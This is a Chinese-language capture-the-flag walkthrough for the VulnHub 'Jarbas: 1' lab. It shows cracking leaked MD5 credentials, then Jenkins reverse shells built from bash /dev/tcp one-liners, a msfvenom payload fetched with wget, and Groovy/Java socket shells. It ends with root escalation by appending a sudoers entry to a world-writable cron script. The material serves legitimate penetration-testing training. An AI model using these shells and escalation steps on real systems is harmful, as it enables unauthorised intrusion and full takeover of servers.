# Jarbas: 1

2024-5-1 https://www.vulnhub.com/entry/jarbas-1,232/

difficulty: not know

## IP

192.168.10.177

## Scan

Open Port -> 22,80,3306,8080

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 28bc493c6c4329573cb8859a6d3c163f (RSA)
|   256 a01b902cda79eb8f3b14debb3fd2e73f (ECDSA)
|_  256 57720854b756ffc3e6166f97cfae7f76 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Jarbas - O Seu Mordomo Virtual!
| http-methods:
|_  Potentially risky methods: TRACE
3306/tcp open  mysql   MariaDB (unauthorized)
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
```

22 ssh 端口，匿名访问无有用信息。

8080 是一个 Jenkins 服务页面，根据经验，Jenkins 登陆后，可以配置执行系统命令，实现反弹 shenll，但是需要我们知道登陆的用户凭据。8080 端口下有一个/robots.txt 文件，提示有一个 build 链接。尝试了弱密码和默认密码登陆都不成功。

80 web 端口是一个网站主页，源代码中也没有什么提示信息。使用 nikto 看看有什么漏洞信息提示，也没有什么重要漏洞提示。

使用 gobuster 进行目录扫描：

```
gobuster dir -t 64 -e -r -k -w ~/tools/dict/fileName5000.txt -u http://192.168.10.177/ -x .php,.txt,.html

http://192.168.10.177/access.html
```

访问下 access 页面，有如下提示信息：

```
Creds encrypted in a safe way!

tiago:5978a63b4654c73c60fa24f836386d87
trindade:f463f63616cb3f1e81ce46b39f882fd5
eder:9b38e2b1e8b12f426b0d208a7ab6cb98
```

得到了 3 个凭据，需要把后面的 md5 值转换成明文，尝试在 md5 网站上找到明文值：

```
tiago:italia99
trindade:marianna
eder:vipsu
```

尝试用上面获得的 3 个凭据，去登陆 Jenkins，只有 eder:vipsu 能登陆成功。

登陆后，直接寻找配置 Jenkins 执行脚本的地方，反弹 shell 到 kali。

### 反弹方法 1：

build 一个项目，在构建环境中选择 Execute shell，并保存以下反弹内容：

```
/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.10.3/5555 0>&1"
```

然后在 kali 监听 5555 端口，立即构建任务，就能获得反弹的 shell 了。

### 反弹方法 2：

点击左侧 系统管理->脚本命令执行，在输入框中执行我们的反弹脚本。

先进行个脚本执行测试：

```
println "which python".execute().text
```

能看到 python 的路径信息，执行 python 反弹脚本，但是发现不能反弹，不知道什么原因，尝试生成后门木马，上传后执行。

先在 kali 上创建反弹程序：

```
msfvenom -p linux/x86/exec CMD="/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.10.3/8888 0>&1'" -f elf -o ./shell.elf
```

```
println "wget http://192.168.10.5/shell.elf -O /tmp/shell.elf".execute().text
println "chmod +x /tmp/shell.elf".execute().text
println "/tmp/shell.elf".execute().text

kali:
nc -lvnp 8888
```

最终得到了反弹的 shell，先升级到完整的 tty。

或者执行下面的 groovy 脚本：

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.10.3/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

```
String host="192.168.10.3";
int port=6666;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

寻找提权路径，先查看 /etc/crontab 发现有一个计划脚本是以 root 权限运行：

```
*/5 * * * * root /etc/script/CleaningScript.sh >/dev/null 2>&1

ls -la */5 * * * * root /etc/script/CleaningScript.sh
-rwxrwxrwx. 1 root root 50 Apr  1  2018 /etc/script/CleaningScript.sh
```

发现这个脚本我们有写入权限，直接写入 sudoers：

```
whoami
echo "echo 'jenkins ALL=(ALL)NOPASSWD:ALL' >> /etc/sudoers" >> /etc/script/CleaningScript.sh
```

过了 5 分钟后，jenkins 拥有了完全的 sudo 权限：

```
sudo -l

sudo su

[root@jarbas ~]# cat flag.txt
Hey!

Congratulations! You got it! I always knew you could do it!
This challenge was very easy, huh? =)

Thanks for appreciating this machine.

@tiagotvrs
```
